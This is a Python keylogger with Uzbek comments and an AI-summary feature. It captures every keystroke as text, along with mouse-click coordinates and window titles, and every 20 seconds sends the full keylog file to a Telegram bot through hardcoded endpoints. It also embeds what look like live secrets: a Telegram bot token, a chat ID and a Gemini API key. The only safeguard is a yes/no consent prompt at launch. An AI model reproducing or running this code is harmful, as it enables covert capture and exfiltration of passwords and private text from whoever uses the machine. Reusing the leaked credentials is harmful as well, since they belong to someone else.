import time
import datetime
import requests
import pygetwindow as gw
from pynput import mouse, keyboard
from google import genai

# --- SOZLAMALAR ---
BOT_TOKEN = '8789508818:AAEJlR3iBoUYSeKqwGXT5ZCVuVGPuNrwZzg'
CHAT_ID = '768225297'
GEMINI_API_KEY = 'AIzaSyBPknZrvn4rduSqZMO1cA03H0dB4mqK7oQ'
INTERVAL_SEC = 20  # Hisobot yuborish oralig'i (soniya)

# --- GLOBAL O'ZGARUVCHILAR ---
key_clicks = 0
mouse_clicks = 0
active_windows = set()
log_text = ""  
click_coords = []  # Faqat click qilingan kordinatalar uchun

# --- HODISALARNI QAYD ETUVCHI FUNKSIYALAR ---
def on_press(key):
    global key_clicks, log_text
    key_clicks += 1

    ignore_keys = [
        keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, 
        keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr, keyboard.Key.caps_lock, 
        keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down, 
        keyboard.Key.left, keyboard.Key.right, keyboard.Key.page_up, keyboard.Key.page_down,
        keyboard.Key.home, keyboard.Key.end, keyboard.Key.insert, keyboard.Key.delete
    ]

    if key in ignore_keys:
        return

    try:
        log_text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_text += " "
        elif key == keyboard.Key.enter:
            log_text += "\n"
        elif key == keyboard.Key.backspace:
            log_text = log_text[:-1]
        elif key == keyboard.Key.tab:
            log_text += "    "
        else:
            clean_key = str(key).replace("Key.", "")
            log_text += f" <{clean_key}> "

def on_click(x, y, button, pressed):
    global mouse_clicks, click_coords
    if pressed:
        mouse_clicks += 1
        # Faqat tugma bosilgan joyning kordinatasini ro'yxatga qo'shamiz
        click_coords.append(f"(X:{int(x)}, Y:{int(y)})")

# --- HAQIQIY AI MODULI (Yangi Google GenAI API) ---
def analyze_activity(keys, clicks, windows):
    if keys == 0 and clicks == 0:
        return "Foydalanuvchi kompyuter oldida emas yoki umuman faol emas."
    
    try:
        client = genai.Client(api_key=GEMINI_API_KEY)
        windows_str = ", ".join(list(windows)) if windows else "Noma'lum"
        
        prompt = f"""
        Sen foydalanuvchining kompyuterdagi xatti-harakatlarini tahlil qiluvchi aqlli yordamchisan. 
        Quyida so'nggi {INTERVAL_SEC} soniya ichida yig'ilgan statistika berilgan:
        
        - Klaviatura bosishlar soni: {keys} ta
        - Sichqoncha bosishlar soni: {clicks} ta
        - Faol bo'lgan dasturlar/oynalar: {windows_str}
        
        Shu ma'lumotlarga asoslanib, foydalanuvchi ayni paytda nima ish qilayotganini tahlil qil. 
        Javobing qisqa, aniq va o'zbek tilida bo'lsin (maksimum 1-2 gap). 
        Faqat xulosani yoz, ortiqcha gap-so'z kerak emas.
        """
        
        response = client.models.generate_content(
            model='gemini-2.5-flash',
            contents=prompt,
        )
        return response.text.strip()
    
    except Exception as e:
        return f"AI xulosa shakllantirishda xatolik yuz berdi: {e}"

# --- TELEGRAMGA YUBORISH FUNKSIYASI ---
def send_to_telegram(report_text, file_path):
    url_msg = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    url_doc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

    try:
        requests.post(url_msg, data={'chat_id': CHAT_ID, 'text': report_text})
        with open(file_path, 'rb') as doc:
            requests.post(url_doc, data={'chat_id': CHAT_ID}, files={'document': doc})
    except Exception as e:
        print(f"[!] Telegramga yuborishda xatolik: {e}")

# --- ASOSIY MONITORING SIKLI ---
def start_monitoring():
    global key_clicks, mouse_clicks, active_windows, log_text, click_coords

    print(f"\n[+] Monitoring boshlandi. Har {INTERVAL_SEC} soniyada hisobot yuboriladi.")

    kb_listener = keyboard.Listener(on_press=on_press)
    # on_move funksiyasi olib tashlandi, endi dastur ancha yengil ishlaydi
    ms_listener = mouse.Listener(on_click=on_click) 
    kb_listener.start()
    ms_listener.start()

    try:
        while True:
            for _ in range(INTERVAL_SEC):
                time.sleep(1)
                try:
                    active_win = gw.getActiveWindow()
                    if active_win and active_win.title:
                        active_windows.add(active_win.title)
                except Exception:
                    pass

            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] AI xulosasi kutilmoqda...")
            
            ai_conclusion = analyze_activity(key_clicks, mouse_clicks, active_windows)
            
            # Kordinatalarni matnga o'giramiz
            click_coords_str = ", ".join(click_coords) if click_coords else "Sichqoncha bosilmadi"

            # Fayl ichiga ma'lumotni joylaymiz
            report_content = (
                f"Sana va vaqt: {timestamp}\n"
                f"Davomiylik: {INTERVAL_SEC} soniya\n"
                f"Klaviatura bosishlar soni: {key_clicks}\n"
                f"Sichqoncha bosishlar soni: {mouse_clicks}\n"
                f"Faol oynalar: {', '.join(list(active_windows)[:5])}\n\n"
                f"📍 MISHKA BOSILGAN KORDINATALAR:\n"
                f"{click_coords_str}\n\n"
                f"🤖 AI Xulosasi: {ai_conclusion}\n"
                f"{'-'*40}\n"
                f"⌨️ YOZILGAN MATN (KEYLOG):\n"
                f"{log_text if log_text.strip() else '[Hech narsa yozilmadi]'}\n"
            )

            filename = f"report_{datetime.datetime.now().strftime('%H-%M-%S')}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report_content)

            print(f"[{timestamp}] Hisobot tayyor: {ai_conclusion}")

            tg_msg = f"📊 Yangi hisobot ({timestamp})\n🤖 AI: {ai_conclusion}"
            send_to_telegram(tg_msg, filename)

            # Keyingi sikl uchun o'zgaruvchilarni tozalash
            key_clicks = 0
            mouse_clicks = 0
            active_windows.clear()
            log_text = ""
            click_coords.clear()

    except KeyboardInterrupt:
        print("\n[!] Dastur to'xtatildi (Ctrl+C).")
        kb_listener.stop()
        ms_listener.stop()

# --- ISHGA TUSHIRISH ---
if __name__ == "__main__":
    print("=== KOMPYUTER FAOLIYATINI MONITORING QILISH TIZIMI ===")
    consent = input("Dasturni ishga tushirishga rozimisiz? (H/Y): ").strip().lower()
    
    if consent in ['h', 'ha', 'y', 'yes']:
        start_monitoring()
    else:
        print("Dastur yopildi.")